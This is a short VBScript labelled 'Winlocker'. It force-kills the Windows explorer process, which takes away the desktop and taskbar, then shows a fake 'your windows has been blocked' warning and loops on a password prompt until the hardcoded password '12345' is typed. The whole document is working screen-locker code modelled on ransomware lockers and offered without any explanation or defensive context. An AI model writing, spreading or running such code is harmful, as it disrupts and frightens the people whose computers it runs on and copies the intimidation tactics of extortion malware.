Do
set t=createobject("Wscript.Shell") 
set kill = createobject("wscript.shell") 
kill.run"taskkill /f /im explorer.exe",0
msgbox"OOPS Youre windows has been blocked To unlock it enter the password!",64,"Winlocker"
x = inputbox("To unblock youre windows,You need to enter password in this panel.","Winlocker")
if (x = "12345") then  
msgbox"You got it! Youre windows will be unblocked",64,"Winlocker"
t.run"explorer"
exit do
else
msgbox"Wrong Password! Try Again!",16,"Winlocker"
end if
loop
